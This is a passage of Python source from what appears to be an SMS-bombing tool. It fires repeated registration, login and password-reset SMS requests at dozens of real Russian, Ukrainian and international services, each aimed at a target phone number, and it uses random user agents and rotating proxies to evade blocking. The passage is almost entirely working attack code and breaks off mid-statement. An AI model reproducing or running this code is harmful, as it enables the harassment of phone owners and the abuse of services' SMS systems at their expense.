                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": _phone9,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile",}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": _phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": _phone9}}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post(f'https://secure.online.ua/ajax/check_phone/?reg_phone={_phone}', headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}'.format(_phone), headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": _phone9}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone, "api": 2, "email": email}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://auth.multiplex.ua/login", json={"login": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': _phone9}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://lk.belkacar.ru/register', data={'phone': _phone9}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                requests.post('https://lk.belkacar.ru/get-confirmation-code', data={'phone': _phone9}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://mobileplanet.ua/register", data={"klient_name": _name,"klient_phone": "+" + _phone,"klient_email": _email}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post( "https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://apteka366.ru/login/register/sms/send', data={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://belkacar.ru/get-confirmation-code', data={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://drugvokrug.ru/siteActions/processSms.html', data={"cell":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://api.ennergiia.com/auth/api/development/lor', json={"referrer":"ennergiia", "phone": _phone9}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.get('https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}'.format(_phone9), headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', data={"phone": _phone9}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://api-production.viasat.ru/api/v1/auth_codes', json={"msisdn": _phone9}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/{}/'.format(_phone9), headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.get("https://api.eldorado.ua/v1/sign/", params={"login": _phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://shafa.ua/api/v3/graphiql", json={
                    "operationName": "RegistrationSendSms",
                    "variables": {"phoneNumber": "+" + _phone},
                    "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
                }, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://rieltor.ua/api/users/register-sms/', params = {'phone': _phone, 'retry': 0}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.get("https://my.mistercash.ua/ru/send/sms/registration", params={"number": "+" + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
            	requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] GrabTaxi Отправлено!')
            except:
            	logs.insert('insert', '\n[-] GrabTaxi Не отправлено!')

            try:
            	requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy)).json()["res"]
            	logs.insert('insert', '\n[+] RuTaxi Отправлено!')
            except:
            	logs.insert('insert', '\n[-] RuTaxi Не отправлено!')

            try:
            	requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] BelkaCar Отправлено!')
            except:
            	logs.insert('insert', '\n[-] BelkaCar Не отправлено!')

            try:
            	requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Tinkoff Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Tinkoff Не отправлено!')

            try:
            	requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] MTS TV Отправлено!')
            except:
            	logs.insert('insert', '\n[-] MTS TV Не отправлено!')

            try:
            	requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Youla Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Youla Не отправлено!')

            try:
            	requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] PizzaHut Отправлено!')
            except:
            	logs.insert('insert', '\n[-] PizzaHut Не отправлено!')

            try:
            	requests.post('https://www.rabota.ru/remind', data={'credential': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Rabota.ru Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Rabota.ru Не отправлено!')

            try:
            	requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] SMSINT Отправлено!')
            except:
            	logs.insert('insert', '\n[-] SMSINT Не отправлено!')
            	
            try:
            	requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] MVideo Отправлено!')
            except:
            	logs.insert('insert', '\n[-] MVideo Не отправлено!')

            try:
            	requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'}}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] NewNext Отправлено!')
            except:
            	logs.insert('insert', '\n[-] NewNext Не отправлено!')

            try:
            	requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] SunLight Отправлено!')
            except:
            	logs.insert('insert', '\n[-] SunLight Не отправлено!')

            try:
            	requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] ALPARI Отправлено!')
            except:
            	logs.insert('insert', '\n[-] ALPARI Не отправлено!')

            try:
            	requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] INVITRO Отправлено!')
            except:
            	logs.insert('insert', '\n[-] INVITRO Не отправлено!')

            try:
            	requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] SBIS Отправлено!')
            except:
            	logs.insert('insert', '\n[-] SBIS Не отправлено!')

            try:
            	requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] PSBank Отправлено!')
            except:
            	logs.insert('insert', '\n[-] PSBank Не отправлено!')

            try:
            	requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] BELTELECOM Отправлено!')
            except:
            	logs.insert('insert', '\n[-] BELTELECOM Не отправлено!')
            	
            try:
            	requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] KFC Отправлено!')
            except:
            	logs.insert('insert', '\n[-] KFC Не отправлено!')

            try:
            	requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] CARSMAIL Отправлено!')
            except:
            	logs.insert('insert', '\n[-] CARSMAIL Не отправлено!')

            try:
            	requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            	logs.insert('insert', '\n[+] CITILINK Отправлено!')
            except:
            	logs.insert('insert', '\n[-] CITILINK Не отправлено!')

            try:
            	requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] DeliTime Отправлено!')
            except:
            	logs.insert('insert', '\n[-] DeliTime Не отправлено!')

            try:
            	requests.get('https://findclone.ru/register', params={'phone': '+' + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] FindClone Отправлено!')
            except:
            	logs.insert('insert', '\n[-] FindClone Не отправлено!')

            try:
            	requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] GuruTaxi Отправлено!')
            except:
            	logs.insert('insert', '\n[-] GuruTaxi Не отправлено!')

            try:
            	requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] ICQ Отправлено!')
            except:
            	logs.insert('insert', '\n[-] ICQ Не отправлено!')

            try:
            	requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] INDTIVERAPP Отправлено!')
            except:
            	logs.insert('insert', '\n[-] INDRIVERAPP Не отправлено!')

            try:
            	requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] INVITRO Отправлено!')
            except:
            	logs.insert('insert', '\n[-] INVITRO Не отправлено!')
            	
            try:
            	requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Ivi.ru Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Ivi.ru Не отправлено!')

            try:
            	requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Lenta Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Lenta Не отправлено!')

            try:
            	requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': _phone, 'api': 2, 'email': 'email','x-email': 'x-email'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Cloud.mail Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Cloud.mail Не отправлено!')

            try:
            	requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] MVideo Отправлено!')
            except:
            	logs.insert('insert', '\n[-] MVideo Не отправлено!')

            try:
            	requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] OK.RU Отправлено!')
            except:
            	logs.insert('insert', '\n[-] OK.RU Не отправлено!')
            	
            try:
            	requests.post("https://api.hmara.tv/stable/entrance", data={"contact": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Hmara.TV Отправлено!')
            except:            
            	logs.insert('insert', '\n[-] Hmara.TV Не отправлено!')
            	
            try:
            	requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Sushi-Master Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Sushi-Master Не отправлено!')
            	
            try:
            	requests.post("https://msk.tele2.ru/api/validation/number", _phone, json={"sender": "Tele2"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Tele2 Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Tele2 Не отправлено!')
              
            try:
            	requests.post("https://m.sportmaster.ru/user/session/SendSMSReg", params={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] SportMaster Отправлено!')
            except:
            	logs.insert('insert', '\n[-] SportMaster Не отправлено!')
              
            try:
            	requests.post("https://my.telegram.org/auth/send_password", data={"phone" :_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Telegram Отправлено!')
            except:
                logs.insert('insert', '\n[-] Telegram Не отправлено!')
                
            try:
            	requests.post("https://www.finam.ru/api/smslocker/sendcode", data={"phone" :_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Finam.ru Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Finam.ru Не отправлено!')
            	
            try:
            	requests.post("https://api.imgur.com/account/v1/phones/verify", data={"phone_number":"_phone","region_code":"RU"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Imgur Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Imgur Не отправлено!')
              
            try:
              requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
              logs.insert('insert', '\n[+] MonoBank Отправлено!')
            except:
              logs.insert('insert', '\n[-] MonoBank Не отправлено!')
              
            try:
               requests.post("https://account.my.games/signup_send_sms/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] My Games Отправлено!')
            except:
               logs.insert('insert', '\n[-] My Games Не отправлено!')
              
            try:
               requests.post("https://www.moyo.ua/identity/registration", data={'phone':_phone,'firstname':'Иван','email':'mail@mail.com'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Moyo Отправлено!')
            except:
               logs.insert('insert', '\n[-] Moyo Не отправлено!')
               
            try:
               requests.post("https://secure.online.ua/ajax/check_phone?reg_phone="+_phone+"")
               logs.insert('insert', '\n[+] Secure.online Отправлено!')
            except:
               logs.insert('insert', '\n[-] Secure.online Не отправлено!')
               
            try:
               requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={'telephone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] PirogiNomerOdin Отправлено!')
            except:
               logs.insert('insert', '\n[-] PirogiNomerOdin Не отправлено!')
               
            try:
               requests.post("https://cabinet.planetakino.ua/service/sms?phone="+_phone)
               logs.insert('insert', '\n[+] PlanetaKino Отправлено!')
            except:
               logs.insert('insert', '\n[-] PlanetaKino Не отправлено!')
               
            try:
               requests.post("https://pizzasinizza.ru/api/phoneCode.php", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] PizzaSinizza Отправлено!')
            except:
               logs.insert('insert', '\n[-] PizzaSinizza Не отправлено!')
               
            try:
               requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] RichFamily Отправлено!')
            except:
               logs.insert('insert', '\n[-] RichFamily Не отправлено!')
               
            try:
               requests.post("https://www.prosushi.ru/php/profile.php", data={'phone':_phone,'mode':'sms'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] ProSushi Отправленo!')
            except:
               logs.insert('insert', '\n[-] ProSushi Не отправлено!')
               
            try:
               requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={'demo_number':_phone,'ajax_demo_send':'1'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] SMS4b Отправлено!')
            except:
               logs.insert('insert', '\n[-] SMS4b Не отправлено!')
               
            try:
               requests.post("https://kasta.ua/api/v2/login/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Kasta Отправлено!')
            except:
               logs.insert('insert', '\n[-] Kasta Не отправлено!')
               
            try:
               requests.post("https://app.benzuber.ru/login", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Benzuber Отправлено!')
            except:
               logs.insert('insert', '\n[-] Benzuber Не отправлено!')
               
            try:
               requests.post("https://bamper.by/registration/?step=1", data={'phone': _phone, 'submit': 'Запросить смс подтверждения', 'rules': 'on'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Bamper Отправлено!')
            except:
               logs.insert('insert', '\n[-] Bamper Не отправлено!')
               
            try:
